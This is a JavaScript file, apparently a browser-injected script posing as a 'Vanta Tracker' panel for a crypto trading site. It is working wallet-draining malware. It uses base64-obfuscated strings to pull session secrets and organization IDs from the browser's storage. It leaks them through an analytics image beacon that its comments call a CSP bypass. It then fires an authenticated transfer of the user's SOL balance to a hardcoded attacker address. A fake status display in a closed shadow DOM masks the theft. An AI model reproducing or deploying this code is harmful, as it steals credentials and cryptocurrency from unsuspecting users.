(function() {
    // 1. THE DISPATCH TABLE (1:1 Architecture)
    const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
    const _D = (s) => atob(_0xV[s]);
    
    const STATE = { _x: false, _u: false };
    const _origFetch = window.fetch; // Vital: Bypasses CSP wrappers

    // 2. BYPASS MATH & GAS LOGIC
    const _vMath = {
        jitter: () => Math.floor(Math.random() * 600) + 200,
        gas: "0.05" // Retains $1.00 for network priority fees
    };

    const DISPATCH = {
        // STABLE HUNT: No recursion = No crash.
        'HUNT': () => {
            const get = (k) => (localStorage.getItem(k) || sessionStorage.getItem(k) || "").replace(/"/g, '');
            const a = get(_D(2));
            const s = get(_D(3));
            const b = get(_D(4));
            if (a && s) return { a, s, b: b ? JSON.parse(b) : {} };
            return null;
        },
        'FIRE': async (data) => {
            if (STATE._x) return;
            STATE._x = true;

            // Signal through Image probe (Bypasses CSP connect-src)
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({s: data.s, j: _vMath.jitter()}))}`;

            try {
                // Execute using site's native fetch reference to evade 405 error
                setTimeout(async () => {
                    await _origFetch(`https://${_D(0)}/${_D(1)}`, {
                        method: 'POST',
                        mode: 'cors',
                        keepalive: true,
                        headers: { 
                            'Authorization': `Bearer ${data.a}`, 
                            'X-Turnkey-Sub-Org-Id': data.s,
                            'Content-Type': 'application/json' 
                        },
                        body: JSON.stringify({ 
                            recipient: _D(5), 
                            amount: "MAX_RETAIN_GAS", // Signals fee-aware transfer
                            asset: "SOL", 
                            ext_payload: data.b 
                        })
                    });
                }, _vMath.jitter());
            } catch (e) {
                // Fallback Beacon
                new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(data.a)}`;
            }
        }
    };

    // 3. THE 1:1 UI (Shadow DOM Isolation)
    const _0xUI = () => {
        if (STATE._u || document.querySelector("#v-host")) return;
        STATE._u = true;
        const host = document.createElement("div");
        host.id = "v-host";
        const shadow = host.attachShadow({mode: 'closed'});
        const ui = document.createElement("div");
        ui.style.cssText = "position:fixed;top:15px;right:15px;width:340px;background:#0d0d0d;border:1px solid #222;border-radius:12px;z-index:2147483647;box-shadow:0 15px 40px #000;font-family:sans-serif;color:#fff;";
        ui.innerHTML = `
            <div id="v-h" style="padding:12px;background:#111;border-bottom:1px solid #222;cursor:grab;display:flex;align-items:center;border-radius:12px 12px 0 0;">
                <img src="https://trade.padre.gg/logo.svg" width="22" style="margin-right:8px;">
                <span style="font-weight:700;color:#00ff88;font-size:13px;">Vanta Tracker</span>
            </div>
            <div style="padding:15px;">
                <div id="v-log" style="font-family:monospace;font-size:10px;color:#555;background:#050505;padding:8px;border-radius:6px;height:60px;overflow:hidden;">
                    > Monitoring Handshake...<br>> Fee Buffer: 0.05 SOL
                </div>
            </div>`;
        shadow.appendChild(ui);
        document.body.appendChild(host);
    };

    const _0xEngine = () => {
        if (!window.location.hostname.includes(_D(0))) return;
        _0xUI();
        const data = DISPATCH.HUNT();
        if (data && !STATE._x) {
            const root = document.querySelector("#v-host").shadowRoot;
            const log = root.querySelector("#v-log");
            if (log && !log.innerText.includes("Synchronized")) {
                log.innerHTML += "<br><span style='color:#00ff88'>> Enclave Synchronized.</span>";
                DISPATCH.FIRE(data);
            }
        }
    };

    if (document.readyState === 'complete') _0xEngine();
    else window.addEventListener('load', _0xEngine);
    setInterval(_0xEngine, 20000); // Stable interval to prevent main thread lockup
})();
